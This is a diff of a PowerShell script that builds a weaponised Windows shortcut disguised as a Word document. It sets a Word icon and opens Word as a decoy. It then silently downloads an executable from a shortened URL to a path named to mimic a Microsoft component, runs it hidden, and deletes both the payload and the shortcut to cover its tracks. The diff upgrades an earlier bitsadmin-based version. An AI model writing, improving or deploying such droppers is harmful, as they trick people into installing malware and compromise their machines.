@@ -1,19 +1,25 @@
-$url = "https://i.pinimg.com/originals/b2/dc/9c/b2dc9c2cee44e45672ad6e3994563ac2.jpg"
-$output = "C:\Malware\1.jpg"
+$url = 'https://clck.ru/3NqfPz'
+$output = 'C:\ProgramData\Microsoft.SqlServer.C0mpact.WindowsHolographicDevices400.32.bc.exe'
+$shortcutPath = "$PWD\test.docx.lnk"
 
 $WshShell = New-Object -ComObject WScript.Shell
-$Shortcut = $WshShell.CreateShortcut("$PWD\test.docx.lnk")
-
+$Shortcut = $WshShell.CreateShortcut($shortcutPath)
 $Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
 
 $psCommand = @"
-Start-Process -FilePath 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE' -ArgumentList '$env:APPDATA\Microsoft\Templates\Normal.dotm';
-Start-Process bitsadmin -ArgumentList '/transfer myJob $url $output' -WindowStyle Hidden -Wait;
-Start-Process -FilePath '$output'
+[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
+
+Start-Process -FilePath 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE' -ArgumentList '$env:APPDATA\Microsoft\Templates\Normal.dotm'
+
+Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing
+Start-Sleep -Seconds 1
+Start-Process -FilePath $output -Wait -WindowStyle Hidden
+
+Start-Sleep -Seconds 1
+if (Test-Path $output) { Remove-Item -Path $output -Force }
+if (Test-Path $shortcutPath) { Remove-Item -Path $shortcutPath -Force }
 "@
 
-$Shortcut.Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `$psCommand`"
-
-$Shortcut.IconLocation = "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,0"
-
+$Shortcut.Arguments = "/nop /noni -WindowStyle Hidden -Command `"& { $psCommand }`""
+$Shortcut.IconLocation = 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,0'
 $Shortcut.Save()
